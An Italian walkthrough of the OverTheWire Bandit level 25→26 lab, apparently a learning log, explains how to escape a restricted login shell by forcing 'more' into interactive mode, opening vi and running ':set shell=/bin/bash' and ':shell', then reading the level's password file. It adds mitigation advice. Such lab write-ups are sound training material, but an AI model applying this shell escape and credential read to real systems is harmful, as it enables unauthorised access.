# Bandit Level 25 → Level 26

## Obiettivo
Sfruttare una shell alternativa (`/usr/bin/showtext`) per ottenere accesso come bandit26 ed eseguire comandi arbitrari.

## Comandi utilizzati

### 1. Identificare la shell alternativa
```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
grep bandit26 /etc/passwd
# Output: bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

### 2. Analizzare la shell alternativa
```bash
cat /usr/bin/showtext
```

Contenuto:
```bash
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0
```

### 3. Forzare more in modalità interattiva
**Prerequisito**: ridurre l'altezza della finestra del terminale a 4-5 righe prima di connettersi:

```bash
ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
```

`more` mostrerà `--More--(xx%)` poiché il file non entra nello schermo.

### 4. Sfruttare more per ottenere una shell
1. Premere `v` per aprire vi/vim dall'interno di more
2. in vi, digitare:

```text
:set shell=/bin/bash
:shell
```

3. Ora si ha una shell bash come bandit26

### 5. Leggere la password

```bash
cat /etc/bandit_pass/bandit26
```

## Analisi Tecnica

### Cosa ho imparato

- **Shell alternative**: possono essere script o programmi arbitrari (non solo `/bin/bash`)
- **More/vim escape**: sfruttare funzionalità interattive di programmi per eseguire comandi
- **Geometria terminale**: influisce sul comportamento di pager come more
- **Variabile TERM**: `TERM=linux` forza un terminale semplice per compatibilità

### Meccanismo dello sfruttamento
1. **Inganno di more**: finestra piccola → more entra in modalità interattiva
2. **Escalation a vi**: `v` apre editor integrato in more
3. **Escalation a shell**: vi può eseguire comandi shell esterni
4. **Bypass restrizioni**: `:set shell=/bin/bash` sovrascrive eventuali shell ristrette

### Domande aperte
- Quali altre applicazioni permettono escape a shell?
- Come identificare e mitigare questi vettori di attacco in ambienti production?
- In penetration test, come enumerare shell alternative?
- Qual è il ruolo di TERM nei programmi terminale e come influisce sulla sicurezza?
- Come implementare shell ristrette sicure?

### Note
Questo livello dimostra un classico vettore di privilege escalation in ambienti Unix.
In scenari reali, vulnerabilità simili appaiono in:

- Server con shell ristrette mal configurate
- Applicazioni che eseguono programmi esterni
- Sistemi con permessi eccessivi per certi file binari

**Best practice per shell alternative**:

1. Usare shell ristrette con whitelist di comandi
2. Disabilitare funzionalità interattive pericolose
3. Isolare in chroot o container
4. Monitorare esecuzioni anomale

**Nota per Windows/PowerShell**: usare Command Prompt o client SSH alternativi (PuTTY) per controllo preciso della geometria terminale.